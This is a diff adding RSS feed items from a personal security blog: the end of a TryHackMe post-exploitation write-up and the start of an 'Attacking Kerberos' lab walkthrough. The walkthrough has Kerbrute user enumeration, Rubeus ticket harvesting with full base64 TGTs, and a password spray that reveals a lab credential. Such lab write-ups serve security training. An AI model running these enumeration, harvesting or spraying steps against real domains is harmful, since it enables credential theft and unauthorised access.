+&lt;p&gt;This room has given a good beginning with post-exploitation however there are a lot of other methods ever-evolving. I suggest to you to go out and do your own research find your own tools that you like to use for post-exploitation. I hope to make another room similar to this covering more advanced topics such as more in-depth backdoors and trojans, pivoting, token impersonation, and silver ticket attacks. I hope that this room has helped to give you a better understanding of how post-exploitation works in a real-world scenario.&lt;/p&gt;
+
+&lt;p&gt;Resources -&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://blog.harmj0y.net/&quot;&gt;https://blog.harmj0y.net/&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://adsecurity.org/?page_id=1821&quot;&gt;https://adsecurity.org/?page_id=1821&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://metasploit.help.rapid7.com/docs/about-post-exploitation&quot;&gt;https://metasploit.help.rapid7.com/docs/about-post-exploitation&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://www.pentest-standard.org/index.php/Post_Exploitation&quot;&gt;http://www.pentest-standard.org/index.php/Post_Exploitation&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://offsec.red/mimikatz-cheat-sheet/&quot;&gt;https://offsec.red/mimikatz-cheat-sheet/&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993&quot;&gt;https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Tools/Malware Used -&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/gentilkiwi/mimikatz&quot;&gt;https://github.com/gentilkiwi/mimikatz&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1&quot;&gt;https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1&quot;&gt;https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+</description>
+        <pubDate>Tue, 21 Jun 2022 00:00:00 -0700</pubDate>
+        <link>http://localhost:4000//TryHackMe-Post-Exploitation-Basics</link>
+        <link href="http://localhost:4000/TryHackMe-Post-Exploitation-Basics"/>
+        <guid isPermaLink="true">http://localhost:4000/TryHackMe-Post-Exploitation-Basics</guid>
+      </item>
+    
+      <item>
+        <title>TryHackMe - Attacking Kerberos</title>
+        <description>&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/attackingkerberos&quot;&gt;https://tryhackme.com/room/attackingkerberos&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Learn how to abuse the Kerberos Ticket Granting Service inside of a Windows Domain Controller&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/kerberos01.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;task-1---introduction&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 1 - Introduction&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;This room will cover:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Initial enumeration using tools like Kerbrute and Rubeus&lt;/li&gt;
+  &lt;li&gt;Kerberoasting&lt;/li&gt;
+  &lt;li&gt;AS-REP Roasting with Rubeus and Impacket&lt;/li&gt;
+  &lt;li&gt;Golden/Silver Ticket Attacks&lt;/li&gt;
+  &lt;li&gt;Pass the Ticket&lt;/li&gt;
+  &lt;li&gt;Skeleton key attacks using mimikatz&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Notes:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Kerberos is the default authentication service for Windows domains.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Ticket Granting Ticket (TGT)&lt;/strong&gt; - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Key Distribution Center (KDC)&lt;/strong&gt; - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Authentication Service (AS)&lt;/strong&gt; - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Ticket Granting Service (TGS)&lt;/strong&gt; - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Service Principal Name (SPN)&lt;/strong&gt; - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;KDC Long Term Secret Key (KDC LT Key)&lt;/strong&gt; - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Client Long Term Secret Key (Client LT Key)&lt;/strong&gt; - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Service Long Term Secret Key (Service LT Key)&lt;/strong&gt; - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Session Key&lt;/strong&gt; - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Privilege Attribute Certificate (PAC)&lt;/strong&gt; - The PAC holds all of the user’s relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;kerberos-authentication-overview&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Kerberos Authentication Overview&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/kerberos02.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).&lt;/li&gt;
+  &lt;li&gt;AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.&lt;/li&gt;
+  &lt;li&gt;TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.&lt;/li&gt;
+  &lt;li&gt;TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.&lt;/li&gt;
+  &lt;li&gt;AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.&lt;/li&gt;
+  &lt;li&gt;AP-REP - 6.) The service grants access&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h5 id=&quot;answer-the-questions-below&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Answer the questions below&lt;/h5&gt;
+
+&lt;p&gt;&lt;strong&gt;What does TGT stand for?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Ticket Granting Ticket&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;What does SPN stand for?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Service Principal Name&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;What does PAC stand for?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Privilege attribute certificate&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;What two services make up the KDC?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;AS, TGS&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;task-2---enumeration-w-kerbrute&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 2 - Enumeration w/ Kerbrute&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/kerbrute03.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;sudo /opt/kerbrute/kerbrute userenum –dc CONTROLLER.local -d CONTROLLER.local User.txt&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xskar㉿cocokali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/thm/attackingkerberos]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /opt/kerbrute/kerbrute userenum &lt;span class=&quot;nt&quot;&gt;--dc&lt;/span&gt; CONTROLLER.local &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; CONTROLLER.local User.txt    
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt; ___/ __ &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt; ___/ / / / __/ _ &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+ / ,&amp;lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__/_/  /_.___/_/   &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_,_/&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_/&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__/                                        
+
+Version: v1.0.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9dad6e1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - 06/20/22 - Ronnie Flathers @ropnop
+
+2022/06/20 11:46:28 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  Using KDC&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+2022/06/20 11:46:28 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;   CONTROLLER.local:88
+
+2022/06/20 11:46:28 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       admin1@CONTROLLER.local
+2022/06/20 11:46:29 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       admin2@CONTROLLER.local
+2022/06/20 11:46:29 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       administrator@CONTROLLER.local
+2022/06/20 11:46:30 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       httpservice@CONTROLLER.local
+2022/06/20 11:46:30 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       machine1@CONTROLLER.local
+2022/06/20 11:46:30 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       machine2@CONTROLLER.local
+2022/06/20 11:46:30 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       user1@CONTROLLER.local
+2022/06/20 11:46:30 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       sqlservice@CONTROLLER.local
+2022/06/20 11:46:30 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       user2@CONTROLLER.local
+2022/06/20 11:46:30 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       user3@CONTROLLER.local
+2022/06/20 11:46:30 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  Done! Tested 100 usernames &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10 valid&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;1.887 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;answer-the-questions-below-1&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Answer the questions below&lt;/h5&gt;
+
+&lt;p&gt;&lt;strong&gt;How many total users do we enumerate?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;10&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;What is the SQL service account name?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;sqlservice&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;What is the second “machine” account name?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;machine2&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;What is the third “user” account name?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;user3&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;task-3---harvesting--brute-forcing-tickets-w-rubeus&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 3 - Harvesting &amp;amp; Brute-Forcing Tickets w/ Rubeus&lt;/h2&gt;
+
+&lt;h3 id=&quot;harvesting-tickets-w-rubeus&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Harvesting Tickets w/ Rubeus&lt;/h3&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Have Rubeus Comlined and on the target machine&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd Downloads&lt;/code&gt; - Navigate to the directory&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Rubeus.exe harvest /interval:30&lt;/code&gt; - Tells rubeus to harvest for TGTs every 30 seconds&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;controller&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;dministrator@CONTROLLER-1 C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ownloads&amp;gt;Rubeus.exe harvest /interval:30
+
+   ______        _                       
+  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_____ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;     | |                                   
+   _____&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;_   _| |__  _____ _   _  ___               
+  |  __  /| | | |  _ &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt; ___ | | | |/___&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;              
+  | |  &lt;span class=&quot;se&quot;&gt;\ \|&lt;/span&gt; |_| | |_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ____| |_| |___ |              
+  |_|   |_|____/|____/|_____&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;____/&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;___/               
+                                                      
+  v1.5.0                                              
+                                                      
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Action: TGT Harvesting &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;with auto-renewal&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;        
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Monitoring every 30 seconds &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;new TGTs          
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Displaying the working TGT cache every 30 seconds 
+
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Refreshing TGT ticket cache &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;6/20/2022 11:51:18 AM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
+
+  User                  :  CONTROLLER-1&lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt;CONTROLLER.LOCAL                                                
+  StartTime             :  6/20/2022 11:26:37 AM                                                         
+  EndTime               :  6/20/2022 9:26:37 PM                                                          
+  RenewTill             :  6/27/2022 11:26:37 AM                                                         
+  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable               
+  Base64EncodedTicket   :                                                                                
+                                                                                                         
+    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 
+
+  User                  :  Administrator@CONTROLLER.LOCAL                                                
+  StartTime             :  6/20/2022 11:48:58 AM                                                         
+  EndTime               :  6/20/2022 9:48:58 PM                                                          
+  RenewTill             :  6/27/2022 11:48:58 AM                                                         
+  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable               
+  Base64EncodedTicket   :                                                                                
+
+    doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
+    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQwMIIELKADAgESoQMCAQKiggQeBIIEGjJica1+uKqjFMSztPTcnK4EqCpqClW2I6ZU
+    fJmjMzWtKQopVktGvROpJNuKuMX1SxU7A+NZuRpF5NfFHrj5Y1qxXJrCTHcgcfL7NOA4nAnrElPLcyufXGP87HpZsJpagqW99cAi
+    +XqSXOomtZYyJNIZlkeSvi+Ug8OXKE0EGKngU7BR5x927akYWKgAiOPy7l11/Gjp2qcPt3u2ut6Ik2DFYDIeKAVsPYf4i1/uuV7f
+    MgjlzODyBo1m3/73KMW2nBhDWzgokegvVXOSbHc8Umx4+wE/osEZD41V2yivgVGR/OE1HmlXdnt6pmm5pN7W063uHRCoJaj711T5
+    Cy1vZlOEnBtqIsG89fxYv/Y4bjVtDwIyk9jugEr3hh9tsmCOmDUvXlw00LQvfUxPxWyYEmTzsvBQ+AEA15lW9LeaJ+OlWtLWM1wc
+    q9whjptAwHOnTZM+X1CNII0Cy5l5FjZ349XsfX0EHgsiVvUnc/TafRE047fy2cVnthJL9nqqjDJsWa1WKkqot8ic4Mi1cgjqHEES
+    HH5EcnP9B+7R0L/FPUv/q9FeKqlaObRCbO0g7RGaTOZ6OSG/G/VdnS5ynCBprySLpbmLCcGumsdZvGuE7HIO9E1u+/6tMTtZ6z9u
+    AVXF+P4mE4yTSKz3x/wQZfp5nlthsXfGTMpVxM9dnc3OHbBDBMT5PcQsswWL6b7P8awH5JY8Mmz4Yz6sb3i6ERMG5RJ3gF7AcWRx
+    n31pTP66iICPUuJW02cKbretMGA7WKvTCHmCu33SYFJWpiJH/Iq1rw21rDCIXgFzsQJTFZSE437SvvttbB9tU7X9h4mmW34zMiu6
+    yK/0qJ4ULA+1A8IwN6MduyL7akEbP+p+EUpPbjCe2YV/OQrOwwXl7SoSC9cV+r4sc6j2dRAsVE0oYHkWYsmtBFle6hk/dg1/fAcE
+    8iDmBlShWafPHgMlv7PETiAyqhffsb172RD0q9x4sOtwo4inf2tqKQj+SH7DXzIY1xpVcbYqhAKTOEfzF0mU08cIlY2XEeKy40HD
+    t5KtbMzmvqfQBhB3iCRqhvwZlRsjvz4NusRt29B+0qXipHeaRUOURzjnICLye5Y9gr/emjWxxA3KqV0rXDXLMFMJnJrs1R2pU0Fr
+    7OVnGWw0D38VqCQqF0bLk4KYAShax0yQjjzPqCtBY80lw8Cz8utpvVT4/lFD5y8Ll39Ih3r0XShVjhgRsgDxcSHauxisvmGzujeC
+    7EXN1KHB0q908DeVxCUb5ZyKKM3lovOU2KvjWi3+0eUUh4ygN0RRO3XfxRN5SRXhDRqd2vvU+W3cT+Ja7ysd9JXxRMfxtEasj8TB
+    aspkcPndgdTmkymBVnhpQYP8vq575JPdi6ubwbih+qSHOxe0Q/q+fAyPI4Fn31dL6KOB9zCB9KADAgEAooHsBIHpfYHmMIHjoIHg
+    MIHdMIHaoCswKaADAgESoSIEIC5U5R1rNWqxS6JJvQAVLtJLsd9U1zkREEuSTD8h1esjoRIbEENPTlRST0xMRVIuTE9DQUyiGjAY
+    oAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjIwNjIwMTg0ODU4WqYRGA8yMDIyMDYyMTA0NDg1OFqnERgP
+    &lt;span class=&quot;nv&quot;&gt;MjAyMjA2MjcxODQ4NThaqBIbEENPTlRST0xMRVIuTE9DQUypJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;brute-forcing--password-spraying-w-rubeus&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Brute-Forcing / Password-Spraying w/ Rubeus&lt;/h3&gt;
+
+&lt;p&gt;Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo 10.10.146.3 CONTROLLER.local &amp;gt;&amp;gt; C:\Windows\System32\drivers\etc\hosts&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Nagivate to Rubueus directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Users\Administrator\Downloads&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Rubeus.exe brute /password:Password1 /noticket&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   ______        _
+  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_____ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;     | |                      
+   _____&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt; ___ | | | |/___&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  | |  &lt;span class=&quot;se&quot;&gt;\ \|&lt;/span&gt; |_| | |_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ____| |_| |___ |
+  |_|   |_|____/|____/|_____&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;____/&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;___/
+
+  v1.5.0
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Blocked/Disabled user &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; Guest
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Blocked/Disabled user &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; krbtgt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] STUPENDOUS &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; Machine1:Password1
